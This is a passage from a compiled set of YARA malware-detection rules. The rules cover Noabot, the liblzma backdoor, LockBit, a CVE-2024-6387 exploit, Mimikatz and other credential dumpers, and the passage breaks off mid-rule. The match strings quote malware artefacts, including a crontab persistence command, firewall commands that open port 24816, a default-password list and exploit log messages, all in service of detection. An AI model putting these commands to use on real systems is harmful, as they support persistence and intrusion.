  Nothing in this License shall be construed as excluding or limiting
any implied license or other defenses to infringement that may
otherwise be available to you under applicable patent law.

  12. No Surrender of Others' Freedom.

  If conditions are imposed on you (whether by court order, agreement or
otherwise) that contradict the conditions of this License, they do not
excuse you from the conditions of this License.  If you cannot convey a
covered work so as to satisfy simultaneously your obligations under this
License and any other pertinent obligations, then as a consequence you may
not convey it at all.  For example, if you agree to terms that obligate you
to collect a royalty for further conveying from those to whom you convey
the Program, the only way you could satisfy both those terms and this
License would be to refrain entirely from conveying the Program.

  13. Use with the GNU Affero General Public License.

  Notwithstanding any other provision of this License, you have
permission to link or combine any covered work with a work licensed
under version 3 of the GNU Affero General Public License into a single
combined work, and to convey the resulting work.  The terms of this
License will continue to apply to the part which is the covered work,
but the special requirements of the GNU Affero General Public License,
section 13, concerning interaction through a network will apply to the
combination as such.

  14. Revised Versions of this License.

  The Free Software Foundation may publish revised and/or new versions of
the GNU General Public License from time to time.  Such new versions will
be similar in spirit to the present version, but may differ in detail to
address new problems or concerns.

  Each version is given a distinguishing version number.  If the
Program specifies that a certain numbered version of the GNU General
Public License "or any later version" applies to it, you have the
option of following the terms and conditions either of that numbered
version or of any later version published by the Free Software
Foundation.  If the Program does not specify a version number of the
GNU General Public License, you may choose any version ever published
by the Free Software Foundation.

  If the Program specifies that a proxy can decide which future
versions of the GNU General Public License can be used, that proxy's
public statement of acceptance of a version permanently authorizes you
to choose that version for the Program.

  Later license versions may give you additional or different
permissions.  However, no additional obligations are imposed on any
author or copyright holder as a result of your choosing to follow a
later version.

  15. Disclaimer of Warranty.

  THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY
APPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT
HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM "AS IS" WITHOUT WARRANTY
OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,
THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM
IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF
ALL NECESSARY SERVICING, REPAIR OR CORRECTION.

  16. Limitation of Liability.

  IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING
WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS
THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY
GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE
USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF
DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD
PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS),
EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF
SUCH DAMAGES.

  17. Interpretation of Sections 15 and 16.

  If the disclaimer of warranty and limitation of liability provided
above cannot be given local legal effect according to their terms,
reviewing courts shall apply local law that most closely approximates
an absolute waiver of all civil liability in connection with the
Program, unless a warranty or assumption of liability accompanies a
copy of the Program in return for a fee.

                     END OF TERMS AND CONDITIONS

            How to Apply These Terms to Your New Programs

  If you develop a new program, and you want it to be of the greatest
possible use to the public, the best way to achieve this is to make it
free software which everyone can redistribute and change under these terms.

  To do so, attach the following notices to the program.  It is safest
to attach them to the start of each source file to most effectively
state the exclusion of warranty; and each file should have at least
the "copyright" line and a pointer to where the full notice is found.

    <one line to give the program's name and a brief idea of what it does.>
    Copyright (C) <year>  <name of author>

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.

Also add information on how to contact you by electronic and paper mail.

  If the program does terminal interaction, make it output a short
notice like this when it starts in an interactive mode:

    <program>  Copyright (C) <year>  <name of author>
    This program comes with ABSOLUTELY NO WARRANTY; for details type `show w'.
    This is free software, and you are welcome to redistribute it
    under certain conditions; type `show c' for details.

The hypothetical commands `show w' and `show c' should show the appropriate
parts of the General Public License.  Of course, your program's commands
might be different; for a GUI interface, you would use an "about box".

  You should also get your employer (if you work as a programmer) or school,
if any, to sign a "copyright disclaimer" for the program, if necessary.
For more information on this, and how to apply and follow the GNU GPL, see
<https://www.gnu.org/licenses/>.

  The GNU General Public License does not permit incorporating your program
into proprietary programs.  If your program is a subroutine library, you
may consider it more useful to permit linking proprietary applications with
the library.  If this is what you want to do, use the GNU Lesser General
Public License instead of this License.  But first, please read
<https://www.gnu.org/licenses/why-not-lgpl.html>.

 */
rule CRAIU_Crime_Noabot : FILE
{
	meta:
		description = "Noabot is a clone of Mirai"
		author = "Costin G. Raiu, Art of Noh, craiu@noh.ro"
		id = "8626783b-898c-587d-9b23-c8c9111cde66"
		date = "2024-01-11"
		modified = "2024-01-11"
		reference = "https://www.akamai.com/blog/security-research/mirai-based-noabot-crypto-mining"
		source_url = "https://github.com/craiu/yararules/blob/23cf0ca22021fa3684e180a18416b9ae1b695243/files/crime_noabot.yara#L2-L57"
		license_url = "https://github.com/craiu/yararules/blob/23cf0ca22021fa3684e180a18416b9ae1b695243/LICENSE"
		hash = "1603202a9115b83224233697f2ca1d36fef60113b94a73a15afed79a459aacc3"
		hash = "16a28951acfe78b81046bfedb0b489efb4c9d3d1d3b8475c39b93cd5105dc866"
		hash = "3da983ef3580a4b1b3b041cd991019b900f7995791c0acb32035ac5706085a63"
		hash = "648a4f33b2c268523378929179af529bc064538326a1202dcdfcd9ee12ae8f6c"
		hash = "829b3c298f7003f49986fb26920f7972e52982651ae6127c6e8e219a86f46890"
		hash = "c723a221cff37a700e0e3b9dc5f69cdd6a4cc82502ac7c144d6ca1eaf963e800"
		hash = "c8d3c0b87176b7f8d5667d479cb40d1b9f030d30afe588826254f26ebb4ac58e"
		logic_hash = "51c63f45f891ee80c5e8428575f12cb5881665cb9fe26018d173335db0f02012"
		score = 75
		quality = 85
		tags = "FILE"
		version = "1.1"

	strings:
		$a1a = "(crontab -l; printf '@reboot %s noa"
		$a1b = "(crontab -l; printf '@reboot %s \"%s\" noa"
		$a2 = {40 6D 61 67 69 63 40 [1-8] 6E 6F 61 [1-8] 0A 0A 49 20 61 69 6E 74 20 79 6F 75 72 20 61 76}
		$a3 = {31 32 33 34 35 36 [1-8] 41 64 6D 69 6E 21 40 23 [1-8] 7A 68 61 6E 67 6A 69 65 31 32 33 [1-8] 43 75 6D 75 6C 75 73 4C 69 6E 75 78 21 [1-8] 61 62 63 31 32 33 24 [1-8] 77 65 62 40 31 32 33 [1-8] 6D 70 69 75 73 65 72 [1-8] 61 74 75 61 6C 69 7A 61}
		$a4 = "HACKED: %s:%d:%s:%s"
		$a5 = {25 64 7C 25 64 00 31 76 57 3F 3E 55 00 26 25 2423 00 67 76 64 64 60 78 65 73 00 00 26 25 24 00}
		$b1 = "ufw allow 24816"
		$b2 = "iptables -I INPUT -p tcp --dport 24816 -j ACCEPT"
		$b3 = "iptables -I OUTPUT -p tcp --dport 24816 -j ACCEPT"
		$b4 = "firewall-cmd --permanent --add-port 24816/tcp"
		$b5 = "magicPussyMommy"
		$c1 = "SOCKET_CREATING_ERROR SCANNER"
		$c2 = "SOCKET_CREATING_ERROR RECYCLE"

	condition:
		filesize < 10MB and ( uint32( 0 ) == 0x464c457f ) and ( ( any of ( $a* ) ) or ( all of ( $b* ) ) or ( all of ( $c* ) ) )
}
rule CRAIU_Unk_Liblzma_Backdoor : FILE
{
	meta:
		description = "liblzma backdoored"
		author = "Costin G. Raiu, Art of Noh, craiu@noh.ro"
		id = "3527227b-e19f-5704-8a56-f7d318890658"
		date = "2024-03-30"
		modified = "2024-03-30"
		reference = "https://seclists.org/oss-sec/2024/q1/268"
		source_url = "https://github.com/craiu/yararules/blob/23cf0ca22021fa3684e180a18416b9ae1b695243/files/unk_liblzma_backdoor.yara#L1-L30"
		license_url = "https://github.com/craiu/yararules/blob/23cf0ca22021fa3684e180a18416b9ae1b695243/LICENSE"
		hash = "8fa641c454c3e0f76de73b7cc3446096b9c8b9d33d406d38b8ac76090b0344fd"
		hash = "319feb5a9cddd81955d915b5632b4a5f8f9080281fb46e2f6d69d53f693c23ae"
		hash = "b418bfd34aa246b2e7b5cb5d263a640e5d080810f767370c4d2c24662a274963"
		hash = "cbeef92e67bf41ca9c015557d81f39adaba67ca9fb3574139754999030b83537"
		logic_hash = "ac58a38bff3020dbc881a78b70cf18279644cf6f3ede8d652be3f345ba00974f"
		score = 75
		quality = 85
		tags = "FILE"
		version = "1.1"

	strings:
		$a1 = {f3 0f 1e fa 55 48 89 f5 4c 89 ce 53 89 fb 81 e7 00 00 00 80 48 83 ec 28 48 89 54 24 18 48 89 4c 24 10}
		$a2 = {48 BF 30 30 30 30 30 30 30 30 8B F1 49 89 D1 89 43 28 48 89 3C 24 BF 3F FC FF 03}

	condition:
		( uint32be( 0 ) == 0x7F454C46 ) and ( filesize < 10MB ) and ( any of them )
}
rule CRAIU_Unk_Liblzma_Encstrings : FILE
{
	meta:
		description = "liblzma backdoor, encoded strings"
		author = "Costin G. Raiu, Art of Noh, craiu@noh.ro"
		id = "ca491b9c-400e-5f5e-9372-e403a095edba"
		date = "2024-03-30"
		modified = "2024-03-30"
		reference = "https://gist.github.com/q3k/af3d93b6a1f399de28fe194add452d01"
		source_url = "https://github.com/craiu/yararules/blob/23cf0ca22021fa3684e180a18416b9ae1b695243/files/unk_liblzma_backdoor.yara#L32-L70"
		license_url = "https://github.com/craiu/yararules/blob/23cf0ca22021fa3684e180a18416b9ae1b695243/LICENSE"
		logic_hash = "99f5c82f941bb5c1f908209e108f9f80a835ad84157a383faa0dde502486dbd3"
		score = 75
		quality = 85
		tags = "FILE"
		version = "1.0"

	strings:
		$a1 = "yolAbejyiejuvnup=Evjtgvsh5okmkAvj" ascii wide
		$a2 = { 04 00 10 08 03 00 00 00 03 00 00 00 03 00 00 00 04 00 78 06 03 00 00 00 03 00 00 00 30 00 0C 00 03 00 00 00 04 00 D8 00 
              03 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 43 00 00 00 32 00 00 00 03 00 00 00 03 00 00 00 13 01 00 00  
              92 00 00 00 12 00 00 00 42 00 00 00 93 00 00 00 62 00 00 00 B3 00 00 00 B2 00 00 00 03 00 00 00 03 00 00 00 93 00 00 00 
              42 00 00 00 C3 00 00 00 B2 00 00 00 03 00 00 00 12 00 00 00 04 00 08 07 04 00 08 01 12 00 00 00 63 00 00 00 03 00 00 00
              13 00 00 00 F2 00 00 00 03 00 00 00 A3 00 00 00 92 00 00 00 33 01 00 00 F2 00 00 00 43 01 00 00 22 00 00 00 22 01 00 00 
              04 00 70 08 22 00 00 00 23 00 00 00 72 01 00 00 B3 01 00 00 92 00 00 00 83 00 00 00 23 00 00 00 82 01 00 00 63 01 00 00  
              13 00 00 00 04 00 A0 01 22 00 00 00 23 00 00 00 72 01 00 00 B3 01 00 00 B2 01 00 00 03 00 00 00 03 00 00 00 03 00 00 00
              23 01 00 00 43 00 00 00 C2 00 00 00 90 01 30 00 72 00 00 00 21 01 04 00 03 01 00 00 92 00 00 00 22 01 00 00 32 00 00 00 }
		$a3 = {
              33 01 00 00 D2 00 00 00 12 00 00 00 13 00 00 00 04 00 40 0C E2 00 00 00 03 00 00 00 53 01 00 00 22 01 00 00 04 00 D0 06
              E2 00 00 00 A3 00 00 00 92 00 00 00 53 01 00 00 A0 00 14 00 D2 01 00 00 04 00 58 09 62 00 00 00 92 00 00 00 04 00 18 04  
              42 01 00 00 13 00 00 00 B3 01 00 00 04 00 E0 04 33 00 00 00 A2 01 00 00 43 01 00 00 92 00 00 00 A2 00 00 00 33 02 00 00 
              72 01 00 00 10 00 40 00 A0 00 30 00 00 02 20 00 A2 00 00 00 21 00 0C 00 12 00 00 00 04 00 90 07 B2 01 00 00 53 00 00 00  
              93 01 00 00 92 00 00 00 22 01 00 00 83 01 00 00 53 00 00 00 82 00 00 00 32 01 00 00 03 02 00 00 62 01 00 00 63 01 00 00 
              B2 00 00 00 22 01 00 00 33 00 00 00 33 00 00 00 73 00 00 00 04 00 18 00 D2 01 00 00 13 02 00 00 52 00 00 00 D3 00 00 00 
              02 01 00 00 C3 00 00 00 52 00 00 00 D3 00 00 00 B2 01 00 00 A3 01 00 00 23 00 00 00 E2 01 00 00 33 00 00 00 33 00 00 00
              B3 01 00 00 A2 00 00 00 53 00 00 00 B3 00 00 00 C2 01 00 00 D3 01 00 00 03 00 00 00 22 00 00 00 63 00 00 00 12 00 00 00 }

	condition:
		( filesize < 15MB ) and ( any of them )
}
rule CRAIU_Susp_Ios_Shutdown
{
	meta:
		description = "Detect shutdown.log files from sysdiags with suspicious entries"
		author = "Costin G. Raiu, Art of Noh, craiu@noh.ro"
		id = "08aa1fb9-7af0-515a-91a8-09ed35e48155"
		date = "2023-12-28"
		modified = "2024-03-05"
		reference = "https://securelist.com/shutdown-log-lightweight-ios-malware-detection-method/111734/"
		source_url = "https://github.com/craiu/yararules/blob/23cf0ca22021fa3684e180a18416b9ae1b695243/files/susp_ios_shutdown.yara#L2-L25"
		license_url = "https://github.com/craiu/yararules/blob/23cf0ca22021fa3684e180a18416b9ae1b695243/LICENSE"
		logic_hash = "936101f2dddb73f6dda41be47d775199c458aa4fecdcf348ed479da620343ea1"
		score = 65
		quality = 85
		tags = ""
		version = "1.0"
		tlp = "TLP:CLEAR"

	strings:
		$a1 = "these clients are still here:"
		$b1 = "/private/var/db/"
		$b2 = "/private/var/tmp/"
		$c1 = "After "

	condition:
		($c1 at 0 ) and $a1 and ( any of ( $b* ) )
}
rule CRAIU_Crime_Lockbit3_Ransomware : FILE
{
	meta:
		description = "Generic LockBit detection, also catches the version used in attacks in Indonesia."
		author = "Costin G. Raiu, TLPBLACK, craiu@noh.ro"
		id = "167788a4-a610-5770-9f51-aa4cc4d3d350"
		date = "2024-07-03"
		modified = "2024-07-03"
		reference = "https://www.bleepingcomputer.com/news/security/meet-brain-cipher-the-new-ransomware-behind-indonesia-data-center-attack/"
		source_url = "https://github.com/craiu/yararules/blob/23cf0ca22021fa3684e180a18416b9ae1b695243/files/crime_lockbit3_ransomware.yara#L2-L32"
		license_url = "https://github.com/craiu/yararules/blob/23cf0ca22021fa3684e180a18416b9ae1b695243/LICENSE"
		hash = "eb82946fa0de261e92f8f60aa878c9fef9ebb34fdababa66995403b110118b12"
		hash = "6e07da23603fbe5b26755df5b8fec19cadf1f7001b1558ea4f12e20271263417"
		logic_hash = "84efb899315379d85a03959359f89fbcb97cbb6477f1ec439380a4d15fed4f53"
		score = 75
		quality = 85
		tags = "FILE"
		version = "1.1"

	strings:
		$a1 = {C3 8BFF53 51 6A0158 0FA2F7C1000000400F95C0 84C074090FC7F0 0FC7F2 59 5B C3 }
		$a2 = {C3 6A0758 33C90FA2F7C3000004000F95C0 84C074090FC7F8 0FC7FA 59 5B C3 }
		$a3 = {C3 0F31 8BC8 C1C90D 0F31 8BD0 C1C20D 8BC1 59 5B C3 }
		$a4 = {55 8BEC 51 52 56 33C0 8B550C 8B7508 AC 33C9 B930000000 8D0C4D01000000 02F1 2AF1 33C9 B906000000 8D0C4D01000000 D3CA 03D0 90 85C0}
		$a5 = {E9 ?? ?? ?? ?? 6683F841 720C 6683F846 7706 6683E837 EB26 6683F861 720C 6683F866 7706 6683E857 EB14 6683F830 720C 6683F839 7706 6683E830 EB}
		$a6 = {5D 8BC3 5F 5E 5B 5D C20C00 90 55 8BEC 53 56 57 33C0 8B5D14 33C9 33D2 8B750C 8B7D08 85F6 }

	condition:
		( filesize < 1MB ) and ( uint16( 0 ) == 0x5a4d ) and ( 2 of them )
}
rule CRAIU_Crashstrike : FILE
{
	meta:
		description = "Crowdstrike C-00000???-*.sys files"
		author = "Costin G. Raiu, Art of Noh, craiu@noh.ro"
		id = "9a5168c4-0a7f-5269-bafa-728f123a04c5"
		date = "2024-07-19"
		modified = "2024-07-19"
		reference = "https://en.wikipedia.org/wiki/July_2024_global_cyber_outages"
		source_url = "https://github.com/craiu/yararules/blob/23cf0ca22021fa3684e180a18416b9ae1b695243/files/20240719_crashstrike.yara#L2-L26"
		license_url = "https://github.com/craiu/yararules/blob/23cf0ca22021fa3684e180a18416b9ae1b695243/LICENSE"
		hash = "9d001ef3206fe2f955095244e6103ad7f8f318c7c5cbd91a0dd1f33e4217fcb2"
		logic_hash = "9a8dacf9d95042851073c40f5eab2a6aff61be3a576363ffcd8c21aaec7f0b96"
		score = 75
		quality = 85
		tags = "FILE"
		version = "1.0"

	strings:
		$a1 = "000E0A000E0GHijklMNOPqRSTUVwX"
		$a2 = "AbCDEfghIjklMNoPqrstuV"

	condition:
		( filesize < 60KB ) and ( uint32( 0 ) == 0xaaaaaaaa ) and ( all of them )
}
rule CRAIU_Exploit_CVE_2024_6387 : CVE_2024_6387 FILE
{
	meta:
		description = "Strings from CVE-2024-6387 exploit PoC by zgzhang."
		author = "Costin G. Raiu, TLPBLACK, craiu@noh.ro"
		id = "6ac63016-864d-57af-bb36-3115a0a91021"
		date = "2024-07-02"
		modified = "2024-07-03"
		reference = "https://github.com/zgzhang/cve-2024-6387-poc/tree/main"
		source_url = "https://github.com/craiu/yararules/blob/23cf0ca22021fa3684e180a18416b9ae1b695243/files/exploit_cve_2024_6387.yara#L2-L38"
		license_url = "https://github.com/craiu/yararules/blob/23cf0ca22021fa3684e180a18416b9ae1b695243/LICENSE"
		hash = "62b06a6c30a0c891c2246ff87c0ad9ae03d2123601ba5331d6348c43b38d185e"
		logic_hash = "d43a77c2690b5e01639590bc31fa64fa36b1da5efd3cc0761be7369ce80e4253"
		score = 75
		quality = 85
		tags = "CVE-2024-6387, FILE"
		version = "1.0"

	strings:
		$a0 = "Attempting exploitation with glibc base: 0x%lx" ascii wide fullword
		$a1 = "Attempt %d of 20000" ascii wide fullword
		$a2 = "Failed to establish connection, attempt %d" ascii wide fullword
		$a3 = "SSH handshake failed, attempt %d" ascii wide fullword
		$a4 = "Possible exploitation success on attempt %d with glibc base 0x%lx!" ascii wide fullword
		$a5 = "Received SSH version: %s" ascii wide fullword
		$a6 = "Connection closed while receiving SSH version" ascii wide fullword
		$a7 = "Received KEX_INIT (%zd bytes)" ascii wide fullword
		$a8 = "Connection closed while receiving KEX_INIT" ascii wide fullword
		$a9 = "Estimated parsing time: %.6f seconds" ascii wide fullword
		$a10 = "Received response after exploit attempt (%zd bytes)" ascii wide fullword
		$a11 = "Possible hit on 'large' race window" ascii wide fullword
		$a12 = "Connection closed by server - possible successful exploitation" ascii wide fullword
		$a13 = "No immediate response from server - possible successful exploitation" ascii wide fullword
		$a14 = "Attempt %d of 10000" ascii wide fullword

	condition:
		( filesize < 5MB ) and ( uint32be( 0 ) == 0x7F454C46 ) and ( 4 of ( $a* ) )
}
/*
 * YARA Rule Set
 * Repository Name: DitekSHen
 * Repository: https://github.com/ditekshen/detection
 * Retrieval Date: 2026-11-22
 * Git Commit: e76c93dcdedff04076380ffc60ea54e45b313635
 * Number of Rules: 603
 * Skipped: 0 (age), 147 (quality), 5 (score), 799 (importance)
 *
 * 
 * LICENSE
 * 
 * Copyright 2021 by ditekSHen (https://github.com/ditekshen/detection).

The 2-Clause BSD License

Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

 */
rule DITEKSHEN_INDICATOR_TOOL_PWS_Credstealer : FILE
{
	meta:
		description = "Detects Python executable for stealing credentials including domain environments. Observed in MuddyWater."
		author = "ditekSHen"
		id = "ab587b12-f3e1-5f08-b27c-03ee9752e513"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L22-L41"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "e729c8b0b1db642acabbc4590833c05ce81447bb89e5f40aea5f0b8ebdee4438"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "PYTHON27.DLL" fullword wide
		$s2 = "C:\\Python27\\lib\\site-packages\\py2exe\\boot_common.pyR" fullword ascii
		$s3 = "C:\\Python27\\lib\\site-packages\\py2exe\\boot_common.pyt" fullword ascii
		$s4 = "subprocess.pyc" fullword ascii
		$s5 = "MyGetProcAddress(%p, %p(%s)) -> %p" fullword ascii
		$p1 = "Dump SAM hashes from target systemss" fullword ascii
		$p2 = "Dump LSA secrets from target systemss" fullword ascii
		$p3 = "Dump the NTDS.dit from target DCs using the specifed method" fullword ascii
		$p4 = "Dump NTDS.dit password historys" fullword ascii
		$p5 = "Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameterss" fullword ascii
		$p6 = "Retrieve plaintext passwords and other information for accounts pushed through Group Policy Preferencess" fullword ascii
		$p7 = "Combo file containing a list of domain\\username:password or username:password entriess" fullword ascii

	condition:
		uint16( 0 ) == 0x5a4d and ( 3 of ( $s* ) and 1 of ( $p* ) )
}
rule DITEKSHEN_INDICATOR_TOOL_PWS_Fgdump : FILE
{
	meta:
		description = "detects all versions of the password dumping tool, fgdump. Observed to be used by DustSquad group."
		author = "ditekSHen"
		id = "2759fce2-db2a-5a48-bb37-931fd847a32d"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L64-L81"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "fdccd91a84374f7c94843bd9c2191720959416acf2e33d7b28b42d63d7ea4ce3"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "dumping server %s" ascii
		$s2 = "dump on server %s" ascii
		$s3 = "dump passwords: %s" ascii
		$s4 = "Dumping cache" nocase ascii
		$s5 = "SECURITY\\Cache" ascii
		$s6 = "LSASS.EXE process" ascii
		$s7 = " AntiVirus " nocase ascii
		$s8 = " IPC$ " ascii
		$s9 = "Exec failed, GetLastError returned %d" fullword ascii
		$10 = "writable connection to %s" ascii

	condition:
		uint16( 0 ) == 0x5a4d and 5 of them
}
rule DITEKSHEN_INDICATOR_TOOL_PWS_Blackbone : FILE
{
	meta:
		description = "detects Blackbone password dumping tool on Windows 7-10 operating system."
		author = "ditekSHen"
		id = "a6d9f9d1-75fb-51af-87ad-80b4e135e759"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L112-L129"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "e9dacd28accaef8a93ff8d3b5cf9437b3848791711a4a7118ab46d2bb6ca42d3"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "BlackBone: %s: " ascii
		$s2 = "\\BlackBoneDrv\\" ascii
		$s3 = "\\DosDevices\\BlackBone" fullword wide
		$s4 = "\\Temp\\BBImage.manifest" wide
		$s5 = "\\Device\\BlackBone" fullword wide
		$s6 = "BBExecuteInNewThread" fullword ascii
		$s7 = "BBHideVAD" fullword ascii
		$s8 = "BBInjectDll" fullword ascii
		$s9 = "ntoskrnl.exe" fullword ascii
		$s10 = "WDKTestCert Ton," ascii

	condition:
		uint16( 0 ) == 0x5a4d and 5 of them
}
rule DITEKSHEN_INDICATOR_TOOL_PWS_Mimikatz : FILE
{
	meta:
		description = "Detects Mimikatz"
		author = "ditekSHen"
		id = "feb236c0-6e0d-5c2c-a050-cf1d000aaf38"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L131-L164"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "42c9c78c88bb7c427d5f0bf1d3b0113205780142b499eb17858037ded0f2971e"
		score = 75
		quality = 73
		tags = "FILE"

	strings:
		$s1 = "mimilib.dll" ascii
		$s2 = "mimidrv.sys" ascii
		$s3 = "mimikatz.exe" ascii
		$s4 = "\\mimidrv.pdb" ascii
		$s5 = "mimikatz" ascii
		$s6 = { 6d 00 69 00 6d 00 69 00 6b 00 61 00 74 00 7a }
		$s7 = { 5c 00 6d 00 69 00 6d 00 69 00 64 00 72 00 76 }
		$s8 = { 6d 00 69 00 6d 00 69 00 64 00 72 00 76 }
		$s9 = "Lecture KIWI_MSV1_0_" ascii
		$s10 = "Search for LSASS process" ascii
		$f1 = "SspCredentialList" ascii
		$f2 = "KerbGlobalLogonSessionTable" ascii
		$f3 = "LiveGlobalLogonSessionList" ascii
		$f4 = "TSGlobalCredTable" ascii
		$f5 = "g_MasterKeyCacheList" ascii
		$f6 = "l_LogSessList" ascii
		$f7 = "lsasrv!" ascii
		$f8 = "SekurLSA" ascii
		$f9 = /Cached(Unlock|Interative|RemoteInteractive)/ ascii
		$dll_1 = { c7 0? 00 00 01 00 [4-14] c7 0? 01 00 00 00 }
		$dll_2 = { c7 0? 10 02 00 00 ?? 89 4? }
		$sys_x86 = { a0 00 00 00 24 02 00 00 40 00 00 00 [0-4] b8 00 00 00 6c 02 00 00 40 00 00 00 }
		$sys_x64 = { 88 01 00 00 3c 04 00 00 40 00 00 00 [0-4] e8 02 00 00 f8 02 00 00 40 00 00 00 }

	condition:
		uint16( 0 ) == 0x5a4d and ( 2 of ( $* ) or 3 of ( $f* ) or all of ( $dll_* ) or any of ( $sys_* ) )
}
rule DITEKSHEN_INDICATOR_TOOL_SCN_Portscan : FILE
{
	meta:
		description = "Detects a port scanner tool observed as second or third stage post-compromise or dropped by malware."
		author = "ditekSHen"
		id = "f270e098-17a0-5d66-acd0-c946a29919f4"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L166-L180"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "ebe5eb045a250ca38a55ac43018548074e9db160d76737c36f8ae5ea268b7b10"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "HEAD / HTTP/1.0" fullword ascii
		$s2 = "Result.txt" fullword ascii
		$s3 = "Example: %s SYN " ascii
		$s4 = "Performing Time: %d/%d/%d %d:%d:%d -->" fullword ascii
		$s5 = "Bind On IP: %d.%d.%d.%d" fullword ascii
		$s6 = "SYN Scan: About To Scan %" ascii
		$s7 = "Normal Scan: About To Scan %" ascii

	condition:
		uint16( 0 ) == 0x5a4d and 5 of them
}
rule DITEKSHEN_INDICATOR_TOOL_PWS_Sniffpass : FILE
{
	meta:
		description = "Detects SniffPass, a password monitoring software that listens on the network and captures passwords over POP3, IMAP4, SMTP, FTP, and HTTP."
		author = "ditekSHen"
		id = "b96498d4-bbe3-5cb8-9c24-91ebb51e078a"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L197-L212"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "9b56ee4bac39b4220b24e92d00076650ffe84b71a60c0213a84fcf21c6cfe4cf"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "\\Release\\SniffPass.pdb" ascii
		$s2 = "Password   Sniffer" fullword wide
